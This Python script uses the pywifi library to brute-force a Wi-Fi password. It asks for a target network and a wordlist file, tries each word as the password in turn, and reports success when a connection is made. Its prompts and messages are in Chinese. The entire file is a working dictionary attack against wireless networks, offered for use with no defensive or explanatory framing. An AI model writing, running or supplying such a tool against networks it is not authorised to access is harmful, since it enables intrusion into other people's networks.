import time

import pywifi
from pywifi import const
from bin import Profile
def connect(SSID_arr,wk):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[wk]
    ssid_num = int(input("输入爆破对象编号："))
    map=read_map()

    SSID = SSID_arr[ssid_num]
    for line in map:
        payload=line.strip()
        PFL=Profile.create_wifi_profile(SSID,payload)
        iface.remove_all_network_profiles()

        tmp_profile=iface.add_network_profile(PFL)

        iface.connect(tmp_profile)
        time.sleep(5)
        print("[-]",payload)

        if iface.status()==const.IFACE_CONNECTED:
            print("成功！密码是：",payload)
            break

        # print(line)
    pass

def read_map():
    map=""
    file_path=input("请输入字典文件路径(不带引号):")
    with open(file_path,"r") as file:
        lines=file.readlines()
    return lines
    pass